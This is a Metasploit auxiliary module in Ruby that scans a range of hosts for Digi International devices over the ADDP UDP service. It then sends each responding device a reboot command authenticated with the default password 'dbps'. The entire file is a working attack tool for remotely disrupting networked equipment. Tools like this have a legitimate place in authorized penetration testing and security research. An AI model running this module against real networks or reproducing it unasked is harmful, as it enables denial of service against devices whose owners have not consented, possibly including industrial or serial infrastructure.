##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'
require 'rex/proto/addp'

class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'        => 'Digi ADDP Remote Reboot Initiator',
			'Version'     => '$Revision$',
			'Description' => 'Reboot Digi International based equipment through the ADDP service',
			'Author'      => 'hdm',
			'References'  =>
				[
					['URL', 'http://qbeukes.blogspot.com/2009/11/advanced-digi-discovery-protocol_21.html'],
					['URL', 'http://www.digi.com/wiki/developer/index.php/Advanced_Device_Discovery_Protocol_%28ADDP%29'],
				],
			'License'     => MSF_LICENSE
		)

		register_options(
		[
			Opt::CHOST,
			OptInt.new('BATCHSIZE', [true, 'The number of hosts to probe in each set', 256]),
			Opt::RPORT(2362),
			OptString.new('ADDP_PASSWORD', [true, 'The ADDP protocol password for each target', 'dbps'])
		], self.class)
	end

	def run_batch_size
		datastore['BATCHSIZE'].to_i
	end

	def rport
		datastore['RPORT'].to_i
	end

	def run_batch(batch)

		print_status("Finding ADDP nodes within #{batch[0]}->#{batch[-1]} (#{batch.length} hosts)")

		@results = {}
		begin
			udp_sock = nil
			idx = 0

			# Create an unbound UDP socket if no CHOST is specified, otherwise
			# create a UDP socket bound to CHOST (in order to avail of pivoting)
			udp_sock = Rex::Socket::Udp.create( { 'LocalHost' => datastore['CHOST'] || nil, 'Context' => {'Msf' => framework, 'MsfExploit' => self} })
			add_socket(udp_sock)

			batch.each do |ip|
				begin
					# Try all currently-known magic probe values
					Rex::Proto::ADDP.request_config_all.each do |pkt|
						begin
							udp_sock.sendto(pkt, ip, rport, 0)
						rescue ::Errno::ENOBUFS
							print_status("Socket buffers are full, waiting for them to flush...")
							while (r = udp_sock.recvfrom(65535, 0.1) and r[1])
								parse_reply(r)
							end
							select(nil, nil, nil, 0.25)
							retry
						end					
					end

				rescue ::Interrupt
					raise $!
				rescue ::Rex::ConnectionError
				end

				if (idx % 30 == 0)
					while (r = udp_sock.recvfrom(65535, 0.1) and r[1])
						parse_reply(r)
					end
				end

				idx += 1
			end

			while (r = udp_sock.recvfrom(65535, 3) and r[1])
				parse_reply(r)
			end

			queue = {}
			@results.each_pair do |ip,res|
				queue[ip] = res
			end
			@results = {}

			queue.each_pair do |ip, res|
				info = Rex::Proto::ADDP.reply_to_string(res)
				print_status("#{ip}:#{rport} Sending reboot request to device with MAC #{res[:mac]}...")
				pkt = Rex::Proto::ADDP.request_reboot(res[:magic], res[:mac], datastore['ADDP_PASSWORD'])
				
				begin
					udp_sock.sendto(pkt, ip, rport, 0)
				rescue ::Errno::ENOBUFS
					print_status("Socket buffers are full, waiting for them to flush...")
					while (r = udp_sock.recvfrom(65535, 0.1) and r[1])
						parse_reply(r)
					end
					select(nil, nil, nil, 0.25)
					retry
				end
							
				while (r = udp_sock.recvfrom(65535, 0.1) and r[1])
					parse_reply(r)
				end
			end

			while (r = udp_sock.recvfrom(65535, 5) and r[1])
				parse_reply(r)
			end

		rescue ::Interrupt
			raise $!
		rescue ::Exception => e
			print_error("Unknown error: #{e.class} #{e} #{e.backtrace}")
		end
	end


	def parse_reply(pkt)
		# Ignore "empty" packets
		return if not pkt[1]

		addr = pkt[1]
		if(addr =~ /^::ffff:/)
			addr = addr.sub(/^::ffff:/, '')
		end

		data = pkt[0]

		@results[addr] ||= {}
		@results[addr] = Rex::Proto::ADDP.decode_reply(data)

		if @results[addr][:cmd] == Rex::Proto::ADDP::CMD_REBOOT_REP
			print_status("#{addr}:#{rport} Reboot Status: " + Rex::Proto::ADDP.reply_to_string(@results[addr]))
		end

		return unless @results[addr][:magic] and @results[addr][:mac]
	end


end
